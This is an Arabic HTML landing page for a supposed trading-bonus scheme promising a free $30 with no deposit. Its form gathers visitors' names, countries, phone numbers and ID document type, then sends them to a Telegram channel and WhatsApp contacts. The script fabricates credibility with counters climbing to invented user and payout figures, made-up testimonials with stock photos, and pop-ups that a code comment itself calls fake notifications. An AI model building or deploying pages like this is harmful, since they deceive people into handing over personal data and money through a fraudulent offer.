<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام المكافآت الذكي | المنصة الرسمية</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@18.1.1/css/intlTelInput.css">
    
    <style>
        :root { 
            --primary: #22c55e; 
            --primary-glow: rgba(34, 197, 94, 0.2);
            --bg: #020617; 
            --card-bg: rgba(15, 23, 42, 0.85);
            --border: rgba(51, 65, 85, 0.6);
            --text-main: #f8fafc;
            --text-dim: #94a3b8;
        }

        body { 
            margin:0; font-family: 'Tajawal', sans-serif; background: var(--bg); color: var(--text-main); 
            background-image: radial-gradient(circle at top right, #1e293b 0%, #020617 60%);
            background-attachment: fixed; line-height: 1.6; padding-bottom: 80px;
        }

        .urgent-bar { 
            background: linear-gradient(90deg, #dc2626, #991b1b);
            padding: 12px; font-weight: 900; position: sticky; top: 0; z-index: 2000; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.3); text-align: center;
        }

        .container { max-width: 650px; margin: 0 auto; padding: 20px; }

        .glass-card { 
            background: var(--card-bg); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px);
            border: 1px solid var(--border); border-radius: 20px; padding: 25px; margin-bottom: 25px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.4); text-align: right; position: relative;
        }

        .section-title { color: var(--primary); font-size: 1.4rem; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; font-weight: 900;}

        /* العدادات */
        .stats-container { display: flex; justify-content: space-around; text-align: center; margin-bottom: 25px; }
        .stat-box h3 { margin: 0; color: var(--primary); font-size: 2rem; font-weight: 900; }
        .stat-box p { margin: 0; color: var(--text-dim); font-size: 0.85rem; }

        /* خطوات العمل */
        .step { display: flex; gap: 15px; margin-bottom: 15px; }
        .step-num { background: var(--primary); color: #fff; min-width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 900; }

        /* الفورم */
        .form-group { margin-bottom: 18px; position: relative; }
        label { display: block; margin-bottom: 6px; font-size: 0.95rem; color: var(--text-dim); font-weight: bold;}
        input, select { 
            width: 100%; padding: 15px; border-radius: 12px; border: 1px solid var(--border); 
            background: rgba(15, 23, 42, 0.6); color: #fff; font-family: 'Tajawal'; font-size: 1rem; box-sizing: border-box;
        }
        input:focus { border-color: var(--primary); outline: none; background: rgba(30, 41, 59, 0.8); }

        /* زر الإرسال */
        .btn-main { 
            width: 100%; padding: 18px; border-radius: 12px; border: none; 
            background: linear-gradient(135deg, #22c55e, #16a34a); color: #fff; 
            font-weight: 900; font-size: 1.1rem; cursor: pointer; transition: 0.3s;
        }
        .btn-main:hover { transform: translateY(-3px); box-shadow: 0 10px 25px var(--primary-glow); }

        /* تجارب المستخدمين */
        .user-review { padding: 15px 0; border-bottom: 1px solid var(--border); display: flex; gap: 15px; align-items: center; }
        .u-img { width: 60px; height: 60px; border-radius: 50%; border: 2px solid var(--primary); object-fit: cover; }

        /* التواصل */
        .contact-btn { 
            display: flex; align-items: center; justify-content: center; gap: 10px;
            width: 100%; padding: 14px; margin-bottom: 12px; border-radius: 10px; 
            text-decoration: none; color: #fff; font-weight: 700;
        }

        /* إصلاح قائمة الدول المنسدلة */
        .iti { width: 100%; }
        .iti__country-list { 
            background-color: #0f172a !important; 
            color: white !important; 
            border: 1px solid #334155 !important;
            z-index: 10000 !important;
            border-radius: 10px !important;
            max-width: 300px !important;
        }
        .iti__country.iti__highlight { background-color: #1e293b !important; }

        /* العناصر العائمة */
        .whatsapp-float { position:fixed; bottom:25px; right:25px; background:#25D366; color:white; width:60px; height:60px; border-radius:50%; display:flex; align-items:center; justify-content:center; text-decoration:none; font-size: 30px; z-index: 1000; box-shadow: 0 5px 20px rgba(0,0,0,0.5);}
        #notify { position:fixed; bottom:25px; left:25px; background: var(--card-bg); padding:12px; border-radius:12px; display:none; border-right: 4px solid var(--primary); z-index: 999; font-size: 0.85rem; font-weight: bold; box-shadow: 0 10px 25px rgba(0,0,0,0.5);}
    </style>
</head>
<body>

<div class="urgent-bar"><i class="fas fa-bolt"></i> عرض محدود: سجل الآن واحصل على بونص تداول 30$ مجاناً!</div>

<div class="container">
    <div style="text-align:center; padding: 25px 0;">
        <h1 style="font-size: 2.2rem; margin-bottom: 5px; font-weight: 900;">نظام المكافآت الذكي 🚀</h1>
        <p style="color: var(--text-dim);">ابدأ رحلة التداول بدون إيداع - الأرباح لك والخسارة علينا</p>
    </div>

    <div class="stats-container">
        <div class="stat-box"><h3 id="uCount">0</h3><p>مشترك نشط</p></div>
        <div class="stat-box"><h3 id="cCount">0</h3><p>دولة عربية</p></div>
        <div class="stat-box"><h3 id="pCount">0</h3><p>أرباح موزعة $</p></div>
    </div>

    <div class="glass-card">
        <div class="section-title"><i class="fas fa-user-plus"></i> انضم إلينا الآن</div>
        
        <div class="form-group">
            <label>الاسم الكامل</label>
            <input type="text" id="name" placeholder="الاسم كما هو في الهوية">
        </div>

        <div class="form-group">
            <label>الدولة</label>
            <select id="countrySelect" onchange="toggleOther(this)">
                <option value="">-- اختر دولتك --</option>
                <option value="اليمن">اليمن</option>
                <option value="السعودية">السعودية</option>
                <option value="الإمارات">الإمارات</option>
                <option value="مصر">مصر</option>
                <option value="الكويت">الكويت</option>
                <option value="عمان">عمان</option>
                <option value="قطر">قطر</option>
                <option value="الأردن">الأردن</option>
                <option value="العراق">العراق</option>
                <option value="المغرب">المغرب</option>
                <option value="الجزائر">الجزائر</option>
                <option value="Other">دولة أخرى...</option>
            </select>
            <input type="text" id="otherCountry" style="display:none; margin-top:10px;" placeholder="اكتب اسم دولتك">
        </div>

        <div class="form-group">
            <label>رقم الهاتف (اختر الرمز من القائمة)</label>
            <input type="tel" id="phone">
        </div>

        <div class="form-group">
            <label>نوع الوثيقة المتوفرة</label>
            <select id="doc">
                <option value="">-- اختر نوع الوثيقة --</option>
                <option>البطاقة الشخصية</option>
                <option>جواز السفر</option>
                <option>رخصة قيادة</option>
            </select>
        </div>

        <button class="btn-main" onclick="submitData()" id="sendBtn">تفعيل البونص 30$ ✅</button>
    </div>

    <div class="glass-card">
        <div class="section-title"><i class="fas fa-star"></i> تجارب المشتركين</div>
        <div id="reviewsContainer"></div>
    </div>

    <div class="glass-card">
        <div class="section-title"><i class="fas fa-headset"></i> الدعم الفني المباشر</div>
        <a href="https://wa.me/967739399064" class="contact-btn" style="background:#25D366;"><i class="fab fa-whatsapp"></i> واتساب الإدارة</a>
        <a href="https://t.me/A_VIP_B" class="contact-btn" style="background:#0088cc;"><i class="fab fa-telegram-plane"></i> قناة التوصيات</a>
        <a href="https://t.me/VIPA_BBOT" class="contact-btn" style="background:#1e40af;"><i class="fas fa-robot"></i> بوت الدعم الفوري</a>
    </div>

</div>

<a class="whatsapp-float" href="https://wa.me/967739399064"><i class="fab fa-whatsapp"></i></a>
<div id="notify"></div>

<script src="https://cdn.jsdelivr.net/npm/intl-tel-input@18.1.1/build/js/intlTelInput.min.js"></script>
<script>
    // إعداد حقل الهاتف مع إصلاح القائمة
    const pInput = document.querySelector("#phone");
    const iti = window.intlTelInput(pInput, {
        separateDialCode: true,
        initialCountry: "auto",
        geoIpLookup: s => fetch("https://ipapi.co/json").then(r => r.json()).then(d => s(d.country_code)).catch(() => s("YE")),
        utilsScript: "https://cdn.jsdelivr.net/npm/intl-tel-input@18.1.1/build/js/utils.js",
        dropdownContainer: document.body // هذا السطر هو الحل لمشكلة ظهور القائمة بالأسفل
    });

    // العدادات
    let u=0, c=0, p=0;
    setInterval(()=>{ if(u<3200) {u+=40; document.getElementById('uCount').innerText = "+"+u;} }, 50);
    setInterval(()=>{ if(c<18) {c++; document.getElementById('cCount').innerText = c;} }, 200);
    setInterval(()=>{ if(p<12000) {p+=150; document.getElementById('pCount').innerText = "+"+p;} }, 40);

    function toggleOther(s) { document.getElementById('otherCountry').style.display = (s.value==='Other')?'block':'none'; }

    // نظام التجارب (كل 4 أيام)
    const revs = [
        {n:"أحمد صالح", c:"اليمن", img:"https://randomuser.me/api/portraits/men/32.jpg", t:"تم تفعيل البونص وبدأت التداول، المصداقية عالية جداً."},
        {n:"سارة محمد", c:"السعودية", img:"https://randomuser.me/api/portraits/women/44.jpg", t:"شكراً لكم، استلمت الأرباح عبر الباير بكل سهولة."},
        {n:"خالد العراقي", c:"العراق", img:"https://randomuser.me/api/portraits/men/65.jpg", t:"نظام عادل جداً، تقاسم الأرباح 50/50 شجعني كثيراً."}
    ];
    document.getElementById('reviewsContainer').innerHTML = revs.map(r=>`
        <div class="user-review">
            <img src="${r.img}" class="u-img">
            <div><strong>${r.n} - ${r.c}</strong><p style="margin:5px 0; font-size:0.9rem;">"${r.t}"</p></div>
        </div>
    `).join('');

    // إشعارات وهمية
    setInterval(() => {
        const names = ["محمد", "علي", "فاطمة", "سعد"];
        const notify = document.getElementById("notify");
        notify.innerHTML = `✅ انضم الآن ${names[Math.floor(Math.random()*names.length)]} وتم قبول طلبه!`;
        notify.style.display = "block";
        setTimeout(()=> notify.style.display="none", 4000);
    }, 10000);

    async function submitData() {
        const btn = document.getElementById("sendBtn");
        const data = {
            name: document.getElementById("name").value,
            country: document.getElementById("countrySelect").value === 'Other' ? document.getElementById("otherCountry").value : document.getElementById("countrySelect").value,
            phone: iti.getNumber(),
            doc: document.getElementById("doc").value
        };

        if(!data.name || !data.phone) return alert("يرجى إكمال البيانات");

        btn.disabled = true; btn.innerText = "جاري الحفظ...";
        try {
            const res = await fetch("/api/register", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify(data)
            });
            if(res.ok) {
                alert("تم إرسال بياناتك! تواصل مع الإدارة للتفعيل الفوري.");
                window.location.href = "https://t.me/A_VIP_B";
            }
        } catch(e) { alert("خطأ في الاتصال"); }
        finally { btn.disabled = false; btn.innerText = "تفعيل البونص 30$ ✅"; }
    }
</script>
</body>
</html>
